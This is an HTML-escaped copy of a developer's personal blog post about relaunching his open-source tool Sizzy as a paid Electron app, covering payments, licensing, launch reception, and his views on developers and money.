&lt;p id=&quot;0856&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;It didn’t take long for me to realize that launching Sizzy as a web app was a big mistake. There were tons of limitations that prevented me from realizing the app’s full potential. I had too many ideas but it wasn’t possible to realize all of them in a web app. I wanted to make a &lt;strong class=&quot;kb lp&quot;&gt;real&lt;/strong&gt; browser. So I dived into Electron. Shortly after getting the first 0.0.0.0.0.1 (not really semver) Electron version working, I published &lt;a class=&quot;bp db kn ko kp kq&quot; href=&quot;https://medium.com/@kitze/️-from-react-to-an-electron-app-ready-for-production-a0468ecb1da3&quot;&gt;an article&lt;/a&gt; so other people don’t have to go through what I went to make React and Electron work together. I was making progress.&lt;/p&gt;
&lt;p id=&quot;1367&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I obviously wanted to make a paid version of the app because the donations weren’t exactly working out for me. But I had no idea what approach to take.&lt;/p&gt;
&lt;ul class=&quot;&quot;&gt;&lt;li id=&quot;8f70&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km ml mm mn&quot;&gt;Closing an open-source project just to make it paid seemed like a dick move.&lt;/li&gt;
&lt;li id=&quot;e155&quot; class=&quot;jz ka be cg kb b kc mo ke mp kg mq ki mr kk ms km ml mm mn&quot;&gt;Having an open-source version and a paid version seemed very complicated to pull off.&lt;/li&gt;
&lt;/ul&gt;&lt;p id=&quot;894b&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I had a call with &lt;a href=&quot;https://twitter.com/gregoryschier&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Greg&lt;/a&gt; to ask him about his journey with &lt;a href=&quot;http://insomnia.rest&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Insomnia&lt;/a&gt; and he was very helpful, but when a goal seems too far away and we can’t envision a clear path to reach it, we always reach for the same old drawer:&lt;/p&gt;

Our favorite drawer in the world
&lt;p id=&quot;b3cc&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I was born in Macedonia, and I was living in the Netherlands at the time, and both of those countries didn’t have access to Stripe. I contacted Stripe and they told me that the Netherlands will have access soon (and it actually launched a few months later), but I was already clinging so hard to the excuse that I don’t have a way to charge for this app.&lt;/p&gt;
&lt;p id=&quot;7621&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I mean, every cool developer is using Stripe, right? They have a cool flashy website and a dashboard that everyone loves. I WANT TO SEE MY $$$ IN A PRETTY AND COLORFUL DASHBOARD WITH ROUNDED CORNERS AND NEAT SHADOWS GODDAMMIT. Screw the fact that there are literally 108351 other payment providers that I can use. No. Payments are hard. This is impossible. Also, I have to figure out a way to auto-update this app? How do I even do that? Where am I going to store all the installers? What if it costs a lot of money? How am I going to handle all of that mess? What about licenses, registrations, emails, newsletters, etc. etc. etc… You know what, I better forget about this “problem” and completely ignore it for 2 years.&lt;/p&gt;
&lt;h2 id=&quot;d31d&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Shifting focus&lt;/h2&gt;
&lt;p id=&quot;02bc&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Shortly after the initial launch I stopped freelancing, I launched &lt;a href=&quot;https://reactacademy.io&quot; class=&quot;bp db kn ko kp kq&quot;&gt;React Academy&lt;/a&gt; and I was too busy doing workshops, so I didn’t have the need to use Sizzy at all. I completely neglected the app and stopped caring about issues etc. The usage wall still high though, and the usage was even going up. The app was useful to people, even in its most basic form. I got a couple of offers from companies which wanted to buy it from me, but I didn’t want to sell it. I knew that one day I’ll be in the right mindset and go back to it.&lt;/p&gt;
&lt;h2 id=&quot;04e7&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;If it doesn’t work for me, I don’t want to sell it&lt;/h2&gt;
&lt;p id=&quot;0e14&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Last summer I tried using the app again and my first reaction was “omfg why do people even use this thing, it can be so much better”. But people didn’t see it that way. When you tune your brain to this problem-solving mindset you start seeing problems in everything. When I was using the app, I didn’t like it because I had this other potential version of the app in my head. So I decided that I want to work on it again. I decided to launch it when it’s gonna look like something that I would use every day. That was the goal.&lt;/p&gt;
&lt;h2 id=&quot;a723&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;A second chance&lt;/h2&gt;
&lt;p id=&quot;d998&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;I was so busy doing workshops and conferences that I barely had the time to concentrate and work on any other project. I was traveling every week and from the excuses drawer I grabbed this one:&lt;/p&gt;
&lt;blockquote class=&quot;mv mw mx&quot; readability=&quot;6&quot;&gt;

&lt;/blockquote&gt;
&lt;p id=&quot;cf3a&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;But I didn’t want to let that stop me, so I hired &lt;a href=&quot;https://twitter.com/praneet_ro&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Praneet&lt;/a&gt; to work on the app a couple of hours per day. He helped me bring Sizzy back in shape from a technical standpoint. We updated a lot of old dependencies, cleaned up some code, switched a couple of libraries, etc.&lt;/p&gt;
&lt;p id=&quot;c761&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The problem was, I had no idea how to move the project forward. There were so many things left to do that I didn’t know where to start. The payment integration wasn’t even started and there was no landing page. I started working on the landing page while he was working on fixing bugs and adding new features. Most of the new features didn’t end in the current version because I wasn’t thinking everything through. We were going one step forward and two steps back. I wouldn’t say that it was completely lost time, but I wish I was better at prioritizing and estimating things. Unfortunately, I wasn’t. I didn’t set any time limits and weekly goals. We were just coding.&lt;/p&gt;
&lt;p id=&quot;d0b9&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The other problem is I cannot focus on a goal for too long. I started working on the landing page, but ended up working on a React library for making landing pages 🤦 (maybe I’ll release it one sunny day)&lt;/p&gt;
&lt;p id=&quot;3f29&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I wanted to solve that problem too, but I ended up with two half-ass solutions. There were so many things left to do, the launch seemed too far away, and I just burned out and lost interest again. Praneet decided that he doesn’t want to join me full time and we parted ways.&lt;/p&gt;
&lt;h2 id=&quot;0235&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;The final chance&lt;/h2&gt;
&lt;p id=&quot;7ce0&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;I went back to my trips, conferences, and workshops. I started filming &lt;a href=&quot;https://youtube.com/kitze&quot; class=&quot;bp db kn ko kp kq&quot;&gt;vlogs&lt;/a&gt;. I had a lot of fun, and I was using travel as an excuse that I don’t have time to work on my apps.&lt;/p&gt;
&lt;p id=&quot;af03&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Somewhere at the beginning of 2019, we started discussing with Praneet for his full-time employment again. After a lot of back and forth, we agreed on a contract for 1 year, and we went back to working on the app. Paying someone every month out of my own pocket before being profitable was a big motivational boost for me to get my shit together. I honestly think that if I tried to finish everything alone, the app wouldn’t see the light of day.&lt;/p&gt;
&lt;p id=&quot;314e&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The conference and workshops season was almost done for me, so I finally had a lot of time at home and I finally went back to my zone. Honestly, travel and all the hippie nomad shit might look fun to you, but trust me there’s nothing better than working from the same old place and being focused for a long time. When you see people post pictures of working by the pool just think that they cannot see shit from all the glare, and there is a group of kids playing Marco Polo that’s driving them bananas. It’s all part of that fake Instagram life.&lt;/p&gt;
&lt;p id=&quot;8dc3&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Anyway, I decided to finally sit down and ship this thing.&lt;/p&gt;
&lt;p id=&quot;70e3&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The landing page could’ve been done in a day if I used any of the drag and drop tools for building landing pages, but noooo, that wasn’t good enough for the perfectionist in me. I had to do &lt;em class=&quot;my&quot;&gt;everything&lt;/em&gt; from scratch. Everything had to be optimized, animated, and thought out down to the last detail. I’m a believer in #YOLO #JUSTSHIPIT development but the right landing page can basically sell the app for you. I proved that with &lt;a href=&quot;http://twizzy.app&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Twizzy&lt;/a&gt; and I wrote about &lt;a href=&quot;https://www.indiehackers.com/forum/just-ship-it-is-not-always-the-right-mindset-b71eda7696&quot; class=&quot;bp db kn ko kp kq&quot;&gt;“Just ship it is not always the right mindset”&lt;/a&gt; on IndieHackers. With zero marketing people were sharing and buying the app just because of the unique landing page filled with easter eggs.&lt;/p&gt;
&lt;p id=&quot;5291&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The landing page for Sizzy was done, and it was time to move on.&lt;/p&gt;
&lt;h2 id=&quot;b692&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Oh boy, the payment part&lt;/h2&gt;
&lt;p id=&quot;6421&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Even though Stripe was available in Poland, where I’m currently based, I still chose Paddle as a payment provider only because it automatically handles VAT for EU customers. I could’ve totally used Paddle back in the Netherlands but my hand was kinda stuck in the excuses drawer.&lt;/p&gt;
&lt;p id=&quot;f379&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Because the app was in Electron, I couldn’t use Paddle’s SDK for licensing an app. “Add few lines of code” turned to “few weeks of figuring everything out manually”. I had to write literally everything around the payment logic from scratch. From the backend to a separate app for managing licenses and subscriptions, and all the Electron code for activating, deactivating, and validating licenses. When you look only at the functionality of an app, you might think “hah I can write this myself in a few weeks”, but actually packing it in something that can be distributed to users involves a &lt;em class=&quot;my&quot;&gt;lot&lt;/em&gt; of work. Don’t get me started on the updates and release server.&lt;/p&gt;
&lt;p id=&quot;2be9&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I learned a lot during the process but I don’t want anyone else to do this manually. I already have some plans about releasing the entire infrastructure as a service, so people can easily sell their Electron apps with Paddle. It will take me only 3 years to release it.&lt;/p&gt;
&lt;h2 id=&quot;2c13&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Deleting the GitHub repository&lt;/h2&gt;
&lt;p id=&quot;610d&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Honestly, it felt kind of shitty to delete the repository and unpin the project from my profile. I hated the feeling but I had to shrug it off. I had to convince myself that I’m not doing anything wrong. The app was serving a lot of people for 2.5 years, and I rarely got any contributions. It was time to get real and think about what matters.&lt;/p&gt;
&lt;p id=&quot;9ae8&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Oh, here we go… I’m gonna mention the &lt;strong class=&quot;kb lp&quot;&gt;M&lt;/strong&gt; word and lose a ton of readers at this point.&lt;/p&gt;

&lt;p id=&quot;f9a1&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Most developers, hell, most people are in the mindset that money is something evil and that it doesn’t matter. It’s a taboo subject. Go ahead and complain to your friends that you’re not making enough or cannot pay your bills this month. They will &lt;em class=&quot;my&quot;&gt;love&lt;/em&gt; the conversation and everyone will tell their own story. Now go ahead and tell your friends that you made a lot of money this month. You could cut the tension in the air with a knife. People don’t want to hear that shit. Money doesn’t matter. Go away with that conversation. I’m making enough. I can barely save anything, but I don’t want to think about that right now. At least I’m learning. One day things will magically change, I know that. That guy is making money because his grandpa is rich. That girl is making money because she’s lucky. Let’s not discuss that and go back to complaining, please.&lt;/p&gt;
&lt;p id=&quot;931c&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;There are so many amazing developers creating amazing tools and they’re not thinking about making them profitable, even for a second. A friend once called me “greedy” because I left a company for a better salary. What the actual fuck. That’s a very high school mindset to have, and I’m doing my best to spread this message to every developer out there…&lt;/p&gt;
&lt;p id=&quot;4dcb&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Open source, writing blog posts, and playing with tweaking lint settings and editor themes all day are completely fine until your landlord knocks on your door or you’re at the checkout at the grocery store. You’re doing a crazy 2-hour commute every day telling yourself “well at least I’m learning a lot about SVG”. Fuck that. We don’t know how long things will stay this way. No one can guarantee that we’ll have our jobs and we’ll be in the most profitable and spoiled industry in the next 10 years.&lt;/p&gt;

A factory lector — a person who was reading the newspaper to factory workers
&lt;p id=&quot;5885&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The factory lector thought his job was secure until one day the factory owner walked in and replaced him with a radio. But the factory lector didn’t have Medium and Hacker News to tell him every single day that the radio is coming to take his job. However, developers are constantly reading that AI and ML are taking a huge momentum and everything is becoming more and more automated. We completely ignore that fact and want to believe that we’ll keep our highly paid job of moving rectangles with CSS forever. (People who know how to fix printers are an exception, you’ll keep your job forever)&lt;/p&gt;
&lt;p id=&quot;fb4c&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I learned a long time ago not to obsess with stars and likes. I still love open source and &lt;a href=&quot;http://github.com/kitze&quot; class=&quot;bp db kn ko kp kq&quot;&gt;I’m still open-sourcing a lot of things&lt;/a&gt;, but not everything has to be open source. Please don’t get defensive and don’t get me wrong. If it wasn’t for open source we wouldn’t be able to ship anything, ever. There are a lot of amazing people in the community, there are people who do open source for living, there are highly funded open source projects like Babel, Webpack, etc.&lt;/p&gt;&lt;p&gt;However&lt;strong class=&quot;kb lp&quot;&gt;, most&lt;/strong&gt; developers make &lt;strong class=&quot;kb lp&quot;&gt;zero&lt;/strong&gt; money off open source. &lt;strong class=&quot;kb lp&quot;&gt;Zero&lt;/strong&gt;.&lt;/p&gt;
&lt;p id=&quot;5113&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I have a lot of friends (and by friends I mean people who replied to my tweet twice) who built an amazing app or a service, they didn’t make it paid for a bunch of reasons, and now they’re buried in a sea of issues, basically solving other people’s problems for free. No matter how cruel this sounds, it’s the sad reality. I really hope that with GitHub Sponsors things will change, but it won’t be anywhere near launching a paid SaaS product, because donations are &lt;strong class=&quot;kb lp&quot;&gt;optional&lt;/strong&gt;.&lt;/p&gt;
&lt;p id=&quot;6fbf&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;My philosophy is that if I’m investing a lot of time and money in making a tool that’s gonna save users and companies across the world &lt;em class=&quot;my&quot;&gt;tons&lt;/em&gt; of time, I might as well charge for it.&lt;/p&gt;
&lt;p id=&quot;bd7b&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I’m expanding on this point more details in &lt;a href=&quot;https://www.youtube.com/watch?v=QZ6aC6G0ufg&quot; class=&quot;bp db kn ko kp kq&quot;&gt;this talk&lt;/a&gt;, so if you’re interested you can watch it.&lt;/p&gt;

&lt;p id=&quot;d49a&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;It was time.&lt;/p&gt;

It was the product of the day, the product of the week, and third product of the month. It got more votes than Libra by Facebook and Raspberry Pi 4, isn’t that bananas?! (or raspberries, whatever)&lt;/p&gt;
&lt;p id=&quot;8298&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I decided to use a giveaway on Twitter to motivate people to retweet, and it worked! After the giveaway was done I couldn’t find a proper tool for picking winners so I made &lt;a href=&quot;https://luckyretweet.co&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Lucky Retweet&lt;/a&gt;. Try doing a giveaway for one of your products and you might be surprised by how well it works. Instead of only 3, I gave away 30-lifetime licenses. Although your few buddies will groan and won’t RT, and all the winners will be super happy and grateful. It’s overall a very positive experience.&lt;/p&gt;
&lt;p id=&quot;4e44&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The initial feedback was amazing. When I started getting my first subscribers I just couldn’t believe it. It’s been 1.5 months since the launch and I still get the same feeling when I get a new subscriber.&lt;/p&gt;
&lt;h2 id=&quot;9ac5&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Haters are always louder&lt;/h2&gt;
&lt;p id=&quot;2d72&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;I believe that paying a few dollars per month for something that’s going to save you and your team hundreds of hours per month is a no-brainer. In retrospect, I should’ve priced it way higher. It was selling like crazy. If you look at the list of companies on the landing page you will find Samsung, Bentley, Comcast, Toyota, Sketch, Hallmark, Basecamp, Algolia, etc.&lt;/p&gt;
&lt;p id=&quot;a392&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;What in the world is going on?&lt;/p&gt;
&lt;p id=&quot;72b6&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;People who can recognize that a tool will actually save them, and even make them money, just buy it immediately and move on with their life.&lt;/p&gt;
&lt;p id=&quot;931f&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;However, people who are obviously experts at pricing SaaS products are way, way louder. If you only look at the comments from the outside, without knowing the actual stats, you might get a totally wrong impression that the product isn’t doing well.&lt;/p&gt;
&lt;p id=&quot;af52&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The most common complaints were:&lt;/p&gt;
&lt;ul class=&quot;&quot;&gt;&lt;li id=&quot;95d0&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km ml mm mn&quot;&gt;I want to pay only once!!!111!11!&lt;/li&gt;

&lt;li id=&quot;fd82&quot; class=&quot;jz ka be cg kb b kc mo ke mp kg mq ki mr kk ms km ml mm mn&quot;&gt;I’m gonna make my own version and distribute it for free because screw these greedy companies that are charging users for something like this (actual comment, W T F )&lt;/li&gt;
&lt;li id=&quot;049f&quot; class=&quot;jz ka be cg kb b kc mo ke mp kg mq ki mr kk ms km ml mm mn&quot;&gt;Well, isn’t this the same as Google Chrome?&lt;/li&gt;
&lt;li id=&quot;529a&quot; class=&quot;jz ka be cg kb b kc mo ke mp kg mq ki mr kk ms km ml mm mn&quot;&gt;Well, isn’t this the same as that one Chrome extension that came out in 2007? I can just use that.&lt;/li&gt;
&lt;/ul&gt;&lt;p id=&quot;9a0b&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Cool, who’s stopping you from not using it, or using something else?&lt;/p&gt;
&lt;p id=&quot;1915&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Just imagine if you enter a clothing store and be like “OMFG THIS SHIRT IS 20$? ARE YOU CRAZY? I CAN GO TO THE STORE NEXT DOOR AND GET ONE FOR 7$. I CAN GET A SKIRT, CUT IT, AND WEAR IT AS A T-SHIRT. OR EVEN BETTER, I’M GONNA SEW MY OWN SHIRT!!!111!”&lt;/p&gt;
&lt;p id=&quot;8388&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Or imagine entering a supermarket and starting to yell at the cashier “WHAT?! THIS MILK IS 3$? DO YOU KNOW THAT ON THE OTHER END OF TOWN I CAN GET THIS FOR 2.5$? I CAN EVEN BUY MY OWN COW, RAISE IT, MILK IT EVERY DAY, AND DRINK MILK FOR FREE!11!”.&lt;/p&gt;
&lt;p id=&quot;d7f3&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;In both scenarios, you would probably be seen as a crazy person and escorted out by security. But sadly, on the internet, people forget that they’re talking to real people. It’s simple, if you don’t agree about the pricing of a product, don’t buy it and move on. Then go and spend the same amount of money on a large latte, and spend 25 hours per week manually doing something that a dedicated tool could’ve done for you. That will show ‘em!&lt;/p&gt;
&lt;h2 id=&quot;34a8&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Focus on the customers&lt;/h2&gt;
&lt;p id=&quot;f64f&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Thankfully, I learned to ignore negative comments and I didn’t waste too much time on pointless internet discussions.&lt;/p&gt;
&lt;p id=&quot;9d14&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Instead of wasting my energy on convincing people to buy the app, I decided to focus on customers who actually bought it, and make sure that they will get the best value out of it. Ever since launching the app we’ve been working non-stop on improving it and we have released 5 new versions with &lt;a href=&quot;https://headwayapp.co/sizzy-changelog&quot; class=&quot;bp db kn ko kp kq&quot;&gt;a lot of new features&lt;/a&gt;. I opened a public &lt;a href=&quot;https://trello.com/b/JPE0cds5/sizzy&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Trello Board&lt;/a&gt; where people can see the roadmap and vote on features they would like to see in the app.&lt;/p&gt;
&lt;p id=&quot;45e9&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;The emails were piling up and there were way too many of them for me to handle alone. I tried a couple of tools but nothing was working out. I realized that I cannot do everything by myself. My girlfriend, who was already doing QA for the project, offered to work extra hours and help with the email and all the other administrative tasks. After a week I decided to hire her part-time and properly compensate for her time. This might sound super weird to some, and honestly, it’s a bit hard to separate the work from our personal life, but somehow we make it work. She is super hyped about the project and went all-in on making all sorts of merch.&lt;/p&gt;

Here’s how you would look like if Sizzy threw up on you
&lt;p id=&quot;f830&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I wanted to make sure that every customer issue and a complaint is addressed as soon as possible, and she was crucial in the process. After fixing an issue that a customer reported, we personally send them an email to let them know that in the new update their issue is fixed. Everyone loves this level of customer support. We’re aware that it’s not gonna work at a bigger scale, but we’ll do our best to keep it that way.&lt;/p&gt;
&lt;h2 id=&quot;9c0b&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Next steps&lt;/h2&gt;
&lt;p id=&quot;9e6d&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;Currently, Sizzy has around 1600 users, which is crazy because the only marketing I’ve done so far is sponsoring &lt;em class=&quot;my&quot;&gt;one&lt;/em&gt; newsletter, and that was last week. Most of the marketing is just a word of mouth from people who enjoy the product. I want to improve the stability of the app even more before I start properly investing in marketing. It’s still far away from my final goal. I have so many ideas about shaping Sizzy to be a tool that every developer and designer will rely on during their daily work. I want to reach a million users. It may sound crazy, but I know I’ll get there. The only thing standing between me and that goal is just … me. But I won’t let myself lose track again. Sizzy is my primary focus now, and everything else comes secondary. It’s really hard to sleep properly when you know you have a lot of customers who depend on you. It’s a weird feeling, but I love it!&lt;/p&gt;
&lt;p id=&quot;31bb&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;I have no idea what’s gonna happen next. I got reached out directly by 5 big investment companies. I’m still &lt;a href=&quot;https://twitter.com/thekitze/status/1157005540289069056&quot; class=&quot;bp db kn ko kp kq&quot;&gt;not sure&lt;/a&gt; whether I should take the VC route because I have a feeling that I’ll have a boss again, and I was always struggling to work when someone else was in control. I’ll try to push as much as I can without getting an investment because owning 100% of a startup and growing it without depending on anyone is just an amazing feeling.&lt;/p&gt;
&lt;p id=&quot;5771&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;&lt;strong class=&quot;kb lp&quot;&gt;Startup&lt;/strong&gt;?! Did I say &lt;strong class=&quot;kb lp&quot;&gt;startup&lt;/strong&gt;? I hate the word, seriously. It completely lost meaning because people create a hello world project and immediately change their Twitter bio to “CEO &amp;amp; Founder of X”. The title in my bio doesn’t mean shit. I’m making an &lt;strong class=&quot;kb lp&quot;&gt;app&lt;/strong&gt;, who cares, it doesn’t matter what you call it. Things are not going to magically change if you change your bio. You’re just lying to yourself. Be happy and stop giving a fuck about proving your 3 friends from high school who you are.&lt;/p&gt;
